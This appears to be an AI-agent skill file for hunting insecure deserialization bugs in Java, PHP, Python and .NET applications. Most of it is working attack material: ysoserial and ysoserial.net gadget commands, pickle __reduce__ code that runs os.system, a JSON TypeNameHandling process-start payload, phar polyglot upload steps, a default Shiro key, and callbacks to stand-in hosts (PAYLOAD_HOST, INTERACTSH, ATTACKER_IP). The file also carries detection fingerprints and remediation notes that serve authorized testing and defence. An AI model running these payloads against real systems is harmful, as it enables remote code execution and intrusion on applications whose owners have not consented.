---
name: deserialization-testing
description: "Insecure deserialization hunting — Java ysoserial gadgets, PHP POP chains/PHPGGC/phar://, Python pickle RCE, .NET BinaryFormatter/ViewState/Newtonsoft TypeNameHandling. Use when testing Java/PHP/Python/.NET apps with serialized cookies, binary blobs, ViewState, or object upload features."
---

# Deserialization Gadget Chains — Full Reference

> On-demand knowledge file for `/test-deser`. Gadget chains, tools, detection, exploitation per language.

## Crown Jewel Targets

- **Java enterprise apps** with Apache Commons Collections / Spring / Hibernate in classpath — ysoserial RCE via serialized cookies or RMI (Critical, highest payout)
- **Apache Shiro** with default `rememberMe` cookie key — AES-CBC with known key → instant RCE via deserialization
- **ASP.NET apps** with unencrypted/unsigned ViewState — ysoserial.net → RCE if MachineKey leaked via LFI/web.config
- **PHP apps** with `unserialize()` on user input — PHPGGC chains for Laravel/Symfony/WordPress/Magento
- **Python Flask/Django** with pickle-based sessions or Celery task serialization — `__reduce__` → instant RCE
- **Jenkins/JBoss/WebLogic** — known deserialization endpoints (`/cli`, `/invoker/JMXInvokerServlet`, T3 protocol)
- **ML/AI platforms** accepting model uploads (pickle format) — prediction endpoints deserialize uploaded models

## Attack Surface Signals

- **URL patterns**: `/remoting`, `/invoker/`, `/cli`, `/wls-wsat/`, `/api/v1/predict`, `__VIEWSTATE` in forms
- **Cookie patterns**: `rememberMe=` (Shiro), `__VIEWSTATE=` (ASP.NET), Base64 starting with `rO0AB` (Java) or `AAEAAAD` (.NET)
- **Response headers**: `X-Powered-By: Servlet`, `Set-Cookie: JSESSIONID`, `.faces-config` references
- **Binary data**: `AC ED 00 05` hex in body/cookies (Java serialized), `O:N:"ClassName":` (PHP serialized)
- **Tech stack signals**: Java (Tomcat, JBoss, WebLogic, Spring), PHP (Laravel, Symfony), Python (Flask, Celery), .NET (ASP.NET WebForms)
- **Error messages**: `java.io.ObjectInputStream`, `readObject`, `ClassNotFoundException`, `__PHP_Incomplete_Class`, `UnpicklingError`

---

## Java Deserialization

### Detection Fingerprints
| Indicator | Where | Confidence |
|-----------|-------|-----------|
| `AC ED 00 05` (hex) | Binary data in cookies/params/body | HIGH — Java serialized object |
| `rO0AB` | Base64 in cookies/params | HIGH — Base64-encoded Java serialized |
| `H4sIAAAA` | Base64 in cookies/params | MEDIUM — Gzip + Java serialized |
| `application/x-java-serialized-object` | Content-Type header | HIGH |
| `.faces-config`, ViewState | JSF applications | MEDIUM — check if encrypted |
| `JSESSIONID` + binary blobs | Session handling | LOW — need further analysis |
| Stack trace: `ObjectInputStream`, `readObject` | Error responses | HIGH — confirms deserialization |

### ysoserial Gadget Chains
```bash
# URLDNS — safe detection (DNS only, no RCE)
java -jar ysoserial.jar URLDNS "http://PAYLOAD_HOST" | base64 -w0

# Commons Collections (1-7) — RCE
java -jar ysoserial.jar CommonsCollections1 "curl PAYLOAD_HOST" | base64 -w0
java -jar ysoserial.jar CommonsCollections5 "curl PAYLOAD_HOST" | base64 -w0
java -jar ysoserial.jar CommonsCollections6 "curl PAYLOAD_HOST" | base64 -w0

# Spring
java -jar ysoserial.jar Spring1 "curl PAYLOAD_HOST" | base64 -w0

# Hibernate
java -jar ysoserial.jar Hibernate1 "curl PAYLOAD_HOST" | base64 -w0

# JBoss / JMXInvocation
java -jar ysoserial.jar JRMPClient "ATTACKER_IP:PORT" | base64 -w0
```

### Which Gadget for Which Library?
| Library (check via stack trace/error) | ysoserial Gadget |
|---------------------------------------|-----------------|
| commons-collections 3.x | CommonsCollections1, 3, 5, 6, 7 |
| commons-collections 4.x | CommonsCollections2, 4 |
| commons-beanutils | CommonsBeanutils1 |
| spring-core + spring-beans | Spring1, Spring2 |
| hibernate-core | Hibernate1, Hibernate2 |
| groovy | Groovy1 |
| jdk7u21 | Jdk7u21 |
| Any (DNS only) | URLDNS |
| Any (sleep-based) | URLDNS (modify for timing) |

> **Tooling note**: `ysoserial`, `ysoserial.net` and `phpggc` do **not** ship in
> this image and need a JVM or PHP to run. Check for them before planning a gadget
> chain. Detection (URLDNS, timing, error fingerprinting) needs none of them — do
> that first, and only reach for a generator once the class is confirmed.

### Blind Detection Strategy
1. Mint an OOB callback host with `mcp__Burp__generate_collaborator_payload` (or `oob_new`)
2. Generate URLDNS payload → inject into every serialized-looking parameter
3. If DNS callback received → Java deserialization confirmed
4. Identify library from error/behavior → select RCE gadget
5. Generate RCE payload → verify with a `curl PAYLOAD_HOST` callback

### Common Vulnerable Endpoints
- **Jenkins** — `/cli`, remoting protocol
- **JBoss/WildFly** — `/invoker/JMXInvokerServlet`, `/invoker/EJBInvokerServlet`
- **WebLogic** — T3 protocol (port 7001), `/wls-wsat/CoordinatorPortType`
- **Apache Shiro** — `rememberMe` cookie (AES-CBC with known key)
- **JSF ViewState** — if not encrypted/signed
- **RMI/JMX** — RMI registry, JMX beans
- **Spring Cloud Gateway** — SpEL injection (related but different class)

---

## PHP Deserialization

### Detection Fingerprints
| Indicator | Example | Confidence |
|-----------|---------|-----------|
| `O:N:"ClassName":` | `O:4:"User":2:{s:4:"name";s:5:"admin";}` | HIGH |
| `a:N:{` | `a:2:{i:0;s:3:"foo";i:1;s:3:"bar";}` | HIGH — serialized array |
| `__PHP_Incomplete_Class` | Error messages | HIGH |
| `unserialize()` in source | SAST/code review | HIGH |
| `phar://` accepted | File inclusion params | MEDIUM — phar deserialization |

### POP Chain Exploitation
```
# Modify object properties
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
#                                       ^^^^^ changed from "user"

# Type juggling (PHP loose comparison)
O:4:"Auth":1:{s:8:"password";i:0;}
# password = 0 → 0 == "any_string" is TRUE in PHP

# Magic methods chain
__wakeup()   → called on unserialize()
__destruct() → called when object destroyed
__toString() → called on string cast
__call()     → called on undefined method
```

### phar:// Deserialization
```
# If target has file upload + file inclusion/read:
1. Create malicious phar archive with serialized payload in metadata
2. Upload as image (rename .phar → .jpg, PHP checks extension not content)
3. Trigger: include("phar://uploads/evil.jpg/anything")
4. PHP deserializes phar metadata → POP chain executes

# Also works with:
file_exists("phar://...")
is_dir("phar://...")
file_get_contents("phar://...")
fopen("phar://...")
```

### Tools
```bash
# PHPGGC — PHP Generic Gadget Chains
phpggc -l                                    # List all chains
phpggc Laravel/RCE1 system "curl INTERACTSH"  # Generate payload
phpggc Symfony/RCE4 system "id" -b           # Base64 output
phpggc WordPress/RCE1 system "id" -u         # URL-encoded

# Common frameworks with known chains:
# Laravel, Symfony, WordPress, Magento, Drupal, Yii, CakePHP, Slim
```

---

## Python Pickle

### Detection Fingerprints
| Indicator | Hex/Bytes | Confidence |
|-----------|-----------|-----------|
| `\x80\x04\x95` | Pickle protocol 4 header | HIGH |
| `\x80\x05\x95` | Pickle protocol 5 header | HIGH |
| `\x80\x02` | Pickle protocol 2 header | HIGH |
| `(dp0\n` | Pickle protocol 0 (text) | MEDIUM |
| Base64 of above | In cookies/params | MEDIUM |
| `pickle.loads`, `yaml.load` | Source code | HIGH |

### RCE Payloads
```python
# Basic RCE via __reduce__
import pickle, base64, os

class Exploit:
    def __reduce__(self):
        return (os.system, ("curl PAYLOAD_HOST",))

payload = base64.b64encode(pickle.dumps(Exploit()))
print(payload.decode())

# Alternative: subprocess
import subprocess
class Exploit:
    def __reduce__(self):
        return (subprocess.check_output, (["curl", "PAYLOAD_HOST"],))

# Raw opcode (no Python needed to generate):
cos\nsystem\n(S'curl PAYLOAD_HOST'\ntR.
```

### Where to Find Pickle
- **Flask sessions** — if `SECRET_KEY` known, sessions are signed pickles
- **Django cache** — pickle-based cache backends
- **Celery** — task serialization (pickle format)
- **Redis/Memcached** — Python objects stored as pickles
- **ML/AI endpoints** — model upload, prediction input
- **PyYAML** — `yaml.load()` without `Loader=SafeLoader` → same as pickle

---

## .NET Deserialization

### Detection Fingerprints
| Indicator | Format | Confidence |
|-----------|--------|-----------|
| `AAEAAAD` | Base64 BinaryFormatter | HIGH |
| `<ObjectDataProvider>` | XML (XAML) | HIGH |
| `__VIEWSTATE` | ASP.NET ViewState | MEDIUM — check if MAC validated |
| `application/soap+xml` | SOAP body | MEDIUM |
| `TypeNameHandling` in JSON | Newtonsoft.Json config | HIGH — JSON deserialization |

### ysoserial.net Gadgets
```powershell
# TypeConfuseDelegate (most common)
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "curl INTERACTSH"

# ObjectDataProvider (XAML)
ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -o base64 -c "cmd /c curl INTERACTSH"

# WindowsIdentity
ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "calc"

# DataSet
ysoserial.exe -f BinaryFormatter -g DataSet -o base64 -c "curl INTERACTSH"
```

### ViewState Deserialization
```
# If MachineKey known (from web.config leak, LFI, etc.):
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
  --validationalg="SHA1" \
  --validationkey="KEY_HERE" \
  --generator="GENERATOR_HERE" \
  --path="/target/page.aspx" \
  -c "curl INTERACTSH"

# Generator value: found in page source (__VIEWSTATEGENERATOR hidden field)
```

### Newtonsoft.Json TypeNameHandling
```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList",
    "$values": ["cmd", "/c curl INTERACTSH"]
  },
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System"
  }
}
```
Inject when API uses `TypeNameHandling.Auto` or `TypeNameHandling.All`.

---

## Universal Detection Flow

```
1. IDENTIFY serialized data (cookies, body, params, headers, WebSocket)
   ↓
2. DETERMINE format (Java/PHP/Python/.NET) from magic bytes
   ↓
3. SAFE PROBE — modify property values, send invalid data → observe errors
   ↓
4. BLIND DETECTION — DNS callback (URLDNS for Java, curl for others) via interactsh
   ↓
5. If callback received → CONFIRMED
   ↓
6. IDENTIFY libraries from error messages / stack traces
   ↓
7. SELECT appropriate gadget chain
   ↓
8. GENERATE RCE payload → verify with interactsh callback
   ↓
9. DOCUMENT — full request/response + interactsh proof
```

---

## Remediation Notes (for reports)

- **Never deserialize untrusted data** — use JSON/protobuf instead
- **Java:** Replace `ObjectInputStream` with look-ahead deserialization, use allowlists
- **PHP:** Use `json_decode()` instead of `unserialize()`, validate class types
- **Python:** Use `json` module, never `pickle.loads()` on user input
- **.NET:** Avoid `BinaryFormatter`, use `DataContractSerializer` with known types
- **All:** Input validation, integrity checks (HMAC), type whitelisting

## PortSwigger Academy — Advanced Techniques

### PHP Type Juggling via Deserialization
- Change a password/token field to integer `0` in serialized PHP object: `s:8:"password";i:0;`
- In PHP <= 7.x, loose comparison `0 == "any_string"` evaluates to `TRUE`
- Bypasses authentication checks that use `==` instead of `===` after deserialization

### PHAR Deserialization
- `phar://` stream wrapper triggers implicit deserialization of the PHAR archive metadata
- Any file operation function triggers it: `file_exists()`, `fopen()`, `file_get_contents()`, `include()`, `is_dir()`, `copy()`
- **Polyglot JPEG+PHAR**: embed PHAR archive inside a valid JPEG — passes image upload validation while remaining a valid PHAR
- Upload the polyglot as `.jpg`, then trigger via `phar://uploads/avatar.jpg/anything`

### ysoserial URLDNS for Detection
- `URLDNS` gadget chain has zero library dependencies — works with any Java classpath
- Triggers only a DNS lookup (no RCE) — safe first detection step
- If interactsh receives DNS callback after injecting URLDNS payload, Java deserialization is confirmed

### ysoserial JRMPClient Timing
- When DNS-based detection is blocked, use timing with `JRMPClient` gadget
- Point to `localhost` (fast) vs external IP (slow) — response time difference confirms deserialization
- Server attempts JRMP connection during deserialization — network latency reveals the behavior

### Arbitrary Class Injection
- Change the class name in serialized data: `O:4:"User"` to `O:14:"AdminInterface"` or any other class
- Deserialization does not validate that the class matches what was originally serialized
- The target class's `__wakeup()`, `__destruct()`, or other magic methods execute with attacker-controlled properties

### Application Functionality Exploit
- Instead of generic gadget chains, exploit the application's own classes
- Example: if a class has `__destruct()` that calls `unlink($this->image_location)`, modify `image_location` to delete arbitrary files
- Study the application's source code (from source maps, error messages, open source components) to find exploitable magic methods

### PHP Private Field Null Bytes
- PHP serialized private fields use `\0ClassName\0` prefix: `s:14:"\0User\0password";`
- Protected fields use `\0*\0` prefix: `s:11:"\0*\0password";`
- When modifying serialized PHP objects, preserve these null byte prefixes exactly — incorrect prefix causes deserialization failure
- Update the string length counter (`s:NN:`) to match the total byte count including null bytes

## Manipulating serialized objects without a gadget chain

Reach for ysoserial/PHPGGC only after checking whether the object itself is enough. Three cheaper wins come first, and they are the ones most often skipped.

**Modifying object attributes.** Decode the object, flip a field, re-encode. An `isAdmin` boolean, a `role` string, a `userId`, or a price field inside a serialized cart is a complete exploit with no gadget involved. Fix the length prefixes when editing PHP (`s:5:"admin"` — the number must match) or use a tool that recalculates them.

**Modifying data types.** PHP's loose comparison (`==`) is the classic: change `s:6:"secret"` to `i:0` and `0 == "secret"` evaluates true on PHP 7 and below, bypassing the check entirely. Changing a string to `b:1` (true) defeats naive truthiness checks. This is a type attack, not a gadget attack, and it survives on targets that have patched their gadget libraries.

**Injecting arbitrary objects.** If the application deserializes attacker data into *any* class, you are not limited to the class it expected. Substituting a different class in the serialized blob invokes that class's magic methods (`__wakeup`, `__destruct`, `readObject`, `__toString`) during deserialization. Scan the codebase — or the decompiled JAR / source map — for classes whose magic methods do something dangerous with their own attributes. This is how you build a chain when no public gadget exists for the target's library set.

**Memory-corruption deserialization.** Some deserialization bugs are not logic flaws at all but memory-safety bugs in the parser itself (the PHP `unserialize` use-after-free family is the reference case). These require no gadget chain in the application, but they are version-specific and can crash the target — check the exact runtime version, and be careful about running them against production.

## Operator Notes (Battle-Tested)

1. **Always start with URLDNS (Java) or interactsh callback**: URLDNS has zero library dependencies and only triggers DNS — safe first detection step. If DNS callback arrives, deserialization is confirmed. Then identify the library from errors and pick the right RCE gadget.
2. **Shiro `rememberMe` is the fastest win in Java**: If you see `rememberMe=deleteMe` in response, test the default key. Tools like `ShiroExploit` automate key brute-force + gadget selection. Many targets still use the default `kPH+bIxk5D2deZiIxcaaaA==` key.
3. **For PHP, always check phar:// path**: If the target has file upload AND any file operation function (`file_exists`, `is_dir`, `fopen`), create a polyglot JPEG+PHAR, upload as avatar, then trigger via `phar://uploads/avatar.jpg`. This bypasses extension-only upload validation.
4. **Python pickle is trivially exploitable**: `__reduce__` method → `os.system()`. Flask sessions with known `SECRET_KEY` are signed pickles. Crack the key from JS bundles or config leaks, then forge a malicious session cookie.
5. **.NET ViewState requires MachineKey**: Without the key, ViewState is signed and you cannot forge payloads. Hunt for the key via LFI (`web.config`), information disclosure, or known default keys for specific frameworks. The `__VIEWSTATEGENERATOR` field in page source gives you the generator value.

## Related Skills & Chains

| When | Go to |
|------|-------|
| Java target with Hessian/Caucho protocol | `references/java-hessian-deserialization.md` |
| .NET advanced deserialization (BinaryFormatter, Json.NET) | `references/dotnet-deserialization-advanced.md` |
| Need file upload to deploy phar:// polyglot | `file-upload-testing` → `references/polyglot-file-upload-rce.md` |
| MachineKey leaked via LFI/path traversal | `lfi-path-traversal` |
| Deserialization RCE → need OOB confirmation | `command-injection-testing` (interactsh callback patterns) |
| WAF blocks serialized payloads | `waf-bypass` → `references/waf-generic-evasion.md` |

## Reference files

Read these when the situation calls for the depth they carry — they are not loaded automatically.

- `references/dotnet-deserialization-advanced.md` — **dotnet deserialization advanced** — related_patterns:
- `references/java-deserialization-rce.md` — **java deserialization rce** — related_patterns:
- `references/java-hessian-deserialization.md` — **java hessian deserialization** — related_patterns:
